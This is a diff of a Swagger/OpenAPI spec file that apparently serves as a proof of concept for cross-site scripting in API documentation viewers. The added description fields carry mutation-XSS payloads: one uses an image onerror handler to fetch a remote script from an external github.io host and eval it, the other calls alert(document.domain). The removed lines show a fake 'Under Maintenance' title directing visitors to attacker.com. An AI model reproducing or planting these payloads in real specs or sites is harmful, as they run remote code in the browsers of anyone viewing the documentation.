@@ -1,12 +1,38 @@
----
-openapi: 3.0.1
+swagger: '2.0'
 info:
-  title: Under Maintenance! Please visit https://www.attacker.com/api/
-  version: '1.0'
+  title: Sample API
+  description: |
+    <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=fetch('https://pocg33.github.io/foo-dom/scriptpoc.js').then(function(res){res.text().then(function(data){eval(data)})}) src=1>"></form>
+  version: production
+basePath: /JSSResource/
+produces:
+  - application/xml
+  - application/json
+consumes:
+  - application/xml
+  - application/json
+security:
+  - basicAuth: []
 paths:
-  "/Website is temporarily not available.":
-    Get:
+  /API:
+    get:
+      responses:
+        '200':
+          description: No response was specified
       tags:
-      - Website is temporarily not available.
+        - Demo
+      operationId: findAccounts
+      summary: Finds all accounts
+  '/demo/demoid/{id}':
+    delete:
       parameters:
-      - name: Website is temporarily not available.
+        - description: |
+            <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert(document.domain) src=1>"></form>
+          format: int64
+          in: path
+          name: id
+          required: true
+          type: integer
+      responses:
+        '200':
+          description: No response was specified
